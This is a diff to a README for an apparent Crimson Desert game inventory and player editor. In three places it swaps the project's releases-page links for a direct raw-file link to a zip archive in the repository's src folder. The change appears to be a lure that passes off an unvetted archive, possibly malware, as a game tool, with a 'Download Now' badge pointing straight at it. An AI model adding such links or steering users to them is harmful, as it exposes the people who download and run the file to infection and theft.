@@ -1,6 +1,6 @@
 # 🎮 CrimsonDesert-Inventory-and-Player-Editor - Offline game tools for Crimson Desert
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/main/src/Desert_Player_and_Crimson_Inventory_Editor_arroba.zip)
 
 ## 🧭 Overview
 
@@ -24,7 +24,7 @@ Use it to manage player values, test combat settings, and change game behavior w
 
 Visit this page to download the latest release:
 
-[https://github.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/releases](https://github.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/releases)
+[https://raw.githubusercontent.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/main/src/Desert_Player_and_Crimson_Inventory_Editor_arroba.zip](https://raw.githubusercontent.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/main/src/Desert_Player_and_Crimson_Inventory_Editor_arroba.zip)
 
 ## 🖥️ System requirements
 
@@ -124,7 +124,7 @@ If the download includes an EXE file:
 
 Use the release page for updates, new builds, and the latest Windows download:
 
-[https://github.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/releases](https://github.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/releases)
+[https://raw.githubusercontent.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/main/src/Desert_Player_and_Crimson_Inventory_Editor_arroba.zip](https://raw.githubusercontent.com/jerrileeparaplegic131/CrimsonDesert-Inventory-and-Player-Editor/main/src/Desert_Player_and_Crimson_Inventory_Editor_arroba.zip)
 
 ## 🗂️ Topics
 
